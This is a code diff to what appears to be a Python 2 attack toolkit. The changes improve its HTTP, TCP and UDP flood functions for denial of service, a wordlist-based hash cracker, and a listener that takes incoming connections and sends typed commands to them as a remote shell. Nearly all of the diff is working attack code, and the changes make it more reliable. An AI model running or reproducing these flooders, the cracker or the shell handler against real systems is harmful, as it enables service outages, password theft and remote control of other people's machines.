@@ -40,7 +40,7 @@ def floodhttp(host,port):
 		try:
 			counter += 1
 			requests.get(url)
-			sys.stdout.write('\r%s[+]%s Sending request '+str(counter)+' to '+host+':'+port) %(green,white)
+			sys.stdout.write('\r%s[+]%s Sending request ' %(green,white) +str(counter)+' to '+host+':'+port)
 		except KeyboardInterrupt:
 			break
 			print ''
@@ -88,16 +88,29 @@ def floodtcp(host,port):
 	import socket, random, sys
 	port = int(port)
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((host,port))
+	try:
+		s.connect((host,port))
+		conn = True
+	except socket.error:
+			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
+			s.close()
+			conn = False
 	counter = 0
 	while 1:
-		try:
-			counter +=1
-			msg = random._urandom(1024)
-			s.send(msg)
-			sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port)) 
-		except KeyboardInterrupt:
-			s.close()
+		if conn:
+			try:
+				counter +=1
+				msg = random._urandom(1024)
+				s.send(msg)
+				sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port)) 
+			except KeyboardInterrupt:
+				s.close()
+				break
+			except socket.error:
+				print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
+				s.close()
+				break
+		else:
 			break
 def floodudp(host):
 	from socket import socket, AF_INET, SOCK_DGRAM
@@ -108,14 +121,18 @@ def floodudp(host):
 			data = random._urandom(2048)
 			port = random.randint(80,8080)
 			s.sendto(data, (host, port))
-			sys.stdout.write('\r%s[+]%s Sending '+str(len(data))+' bytes to '+host+':'+str(port)) %(green,white)
+			sys.stdout.write('\r%s[+]%s Sending ' %(green,white)+str(len(data))+' bytes to '+host+':'+str(port))
 		except KeyboardInterrupt:
+			s.close()
+			break
+		except socket.error:
+			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
 			s.close()
 			break
 def hashkiller(wordl, hash):
 	import hashlib, sys
 	hashes = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
-	hashtype = raw_input('%s[*]%s Hash type (ex: md5): ').lower() %(blue,white)
+	hashtype = raw_input(blue+'[*]'+white+' Hash type (ex: md5): ').lower()
 	if hashtype in hashes:
 		# verify user input
 		if hashtype == 'md5':
@@ -138,11 +155,12 @@ def hashkiller(wordl, hash):
 		# open e read wordlist
 		wl = open(wordl)
 		rd = wl.readlines()
+		rd.sort(key=len)
 		for i in rd: # start bruteforce
 			if i.endswith('\n'):
 				i = i.replace('\n','')
-			sys.stdout.write('\r%s[*]%s Atual word: %s' %(blue,white,i))
 			sys.stdout.flush()
+			sys.stdout.write('\r%s[*]%s Atual word: %s' %(blue,white,i))
 			if crack(i).hexdigest() == hash: # check if encoded word is equal the parsed hash
 				print '\n%s[+]%s Hash founded!' %(green,white)
 				print 'Your hash is: %s' % i
@@ -162,11 +180,11 @@ def listener():
 	host = ('', port)
 	s.bind(host)
 	s.listen(5)
-	print '%s[*]%s Listener started at port %i' %(blue,white,port)
+	print blue+'[*]'+white+' Listener started at port '+str(port)
 	while 1:
 		try:
 			c, addr = s.accept()
-			print '%s[+]%s Connection from', addr %(green,white)
+			print green+'[+]'+white+' Connection from', addr
 			while True:
 				cmd = raw_input('shell# ')
 				c.send(cmd)
